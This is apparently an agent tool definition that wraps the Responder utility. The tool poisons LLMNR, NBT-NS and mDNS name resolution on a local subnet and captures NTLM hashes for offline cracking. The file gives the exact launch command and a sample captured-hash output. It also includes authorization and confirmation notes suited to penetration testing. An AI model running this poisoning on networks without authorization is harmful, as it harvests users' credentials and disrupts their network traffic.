---
name: responder_poison
description: >
  Run Responder to poison LLMNR, NBT-NS, and mDNS name-resolution queries,
  capturing NTLM hashes from any Windows/macOS clients that misresolve hostnames.
  DISRUPTIVE — actively answers broadcast queries on the local subnet.
parameters_schema:
  type: object
  properties:
    interface:
      type: string
      description: Interface to listen and answer on
    duration_s:
      type: integer
      description: How long to run, in seconds. Default 300.
    protocols:
      type: array
      items:
        type: string
        enum: ["LLMNR", "NBT-NS", "mDNS"]
      description: Which broadcast protocols to poison. Default all three.
    analyze_mode:
      type: boolean
      description: If true, listen but do not answer (recon only). Default false.
  required:
    - interface
sensitivity: disruptive
allowed_tools:
  - responder_poison
---

# Responder Poison

Classic internal-network credential harvesting via broadcast-name-resolution
poisoning. Windows clients querying LLMNR/NBT-NS for misspelled or nonexistent
hostnames get Responder's IP back, then attempt NTLM auth. Captured NTLMv1/v2
hashes are crackable offline.

## What it returns

```json
{
  "duration_s": 300,
  "poisoned_queries": 247,
  "hashes_captured": [
    {
      "hash_type": "NTLMv2",
      "username": "CORP\\alice",
      "source_ip": "192.168.1.42",
      "timestamp": "2026-04-20T14:30:12Z",
      "hash_file": "captures/hashes_ntlmv2.txt"
    }
  ],
  "log_file": "captures/responder_1745174400.log"
}
```

## Implementation

Use the `Responder` tool (github.com/lgandx/Responder). Runs as a daemon;
poll its log file for captured hashes.

```
sudo responder -I wlan0 -rdwv
```

The `-A` flag enables analyze-only mode (no poisoning) for recon.

## Scope

- **Active poisoning is very detectable.** Shows up instantly in any
  Windows Event Log or SIEM with basic detection rules.
- Only on networks with explicit authorization
- The disclosure layer will require hold-to-confirm
